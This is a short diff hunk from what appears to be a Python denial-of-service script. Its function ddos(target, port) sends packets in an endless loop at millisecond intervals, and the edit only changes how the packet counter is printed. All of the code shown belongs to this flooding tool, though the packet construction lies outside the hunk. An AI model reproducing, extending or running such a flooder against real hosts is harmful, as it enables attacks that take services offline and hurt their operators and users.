@@ -17,7 +17,7 @@ def ddos(target, port):
         try:
             while True:
                 send(pkt,inter= .001)
-                print(f"Packet(s) sent [{i}]" , end = "\r")
+                print(f"Packet(s) sent [{i}]")
                 i=i+1
         except KeyboardInterrupt:
             sys.exit('\n')
